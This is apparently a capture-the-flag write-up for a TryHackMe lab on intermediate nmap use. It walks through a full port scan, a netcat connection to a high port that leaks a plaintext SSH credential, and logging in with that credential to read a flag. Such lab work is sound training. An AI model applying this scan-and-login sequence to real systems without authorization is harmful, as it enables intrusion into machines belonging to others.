# [Intermediate Nmap](https://tryhackme.com/room/intermediatenmap)

## Can you combine your great nmap skills with other tools to log in to this machine?

You've learned some great `nmap` skills! Now can you combine that with other skills with `netcat` and protocols, to log in to this machine and find the flag? This VM MACHINE_IP is listening on a high port, and if you connect to it it may give you some information you can use to connect to a lower port commonly used for remote access!

### Find the flag!

1. Start with a full port scan to enumerate all 65535 TCP ports, since the target is listening on a non-standard high port that a default scan would miss.

```bash
nmap -p- <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE
22/tcp    open  ssh
2222/tcp  open  EtherNetIP-1
31337/tcp open  Elite
```

2. Connect to port 31337 using `netcat` to see what the service exposes.

```bash
nc <TARGET_IP> 31337
```

**Results:**

```
In case I forget - user:pass
ubuntu:Dafdas!!/str0ng
```

> The service leaks a plaintext username/password pair.

3. Use the discovered credentials to log in via SSH on port 22.

```bash
ssh ubuntu@<TARGET_IP>
# Password: Dafdas!!/str0ng
```

4. Once logged in, read the flag from the user's home directory.

```bash
cat /home/user/flag.txt
```

[SCREEN01]
